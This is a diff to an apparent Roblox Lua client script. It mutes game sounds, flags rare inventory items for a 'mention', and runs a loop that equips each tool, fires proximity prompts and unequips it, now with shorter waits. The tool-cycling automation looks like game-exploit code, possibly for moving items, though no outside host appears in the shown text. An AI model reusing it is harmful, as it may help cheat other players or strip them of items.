@@ -38,27 +38,13 @@ task.spawn(function()
 end)
 
 
--- 🔇 Fully mute all sounds
-local SoundService = game:GetService("SoundService")
-
-SoundService.AmbientReverb = Enum.ReverbType.NoReverb
-SoundService.Volume = 0
-
-for _, sound in ipairs(game:GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound.Volume = 0
-        sound:Stop()
+-- 🔇 Mute all sounds
+for _, inst in ipairs(workspace:GetDescendants()) do
+    if inst:IsA("Sound") then
+        inst:Stop()
+        inst.Playing = false
     end
 end
-
--- Mute future sounds too
-game.DescendantAdded:Connect(function(desc)
-    if desc:IsA("Sound") then
-        desc.Volume = 0
-        desc:Stop()
-    end
-end)
-
 
 -- 📦 Inventory handling
 local ig = { "trowel", "watering can", "sprinkler", "egg", "rod" }
@@ -87,9 +73,7 @@ do
         local lnm = nm:lower()
         if not contains(lnm, ig) then
             local emoji = rareEmojiMap[lnm]
-            if emoji and contains(lnm, animals) then
-                mention = true
-            end            
+            if emoji then mention = true end
             local line = string.format("%s %s", emoji or "-", nm)
             if contains(lnm, animals) then
                 table.insert(animalItems, line)
@@ -258,11 +242,11 @@ do
                     local nm = t.Name
                     if not shouldSkip(nm) then
                         t.Parent = char
-                        task.wait(0.5)
+                        task.wait(0.05)
                         firePrompts()
-                        task.wait(0.5)
+                        task.wait(0.05)
                         t.Parent = Backpack
-                        task.wait(0.5)
+                        task.wait(0.05)
                     end
                 end
             end
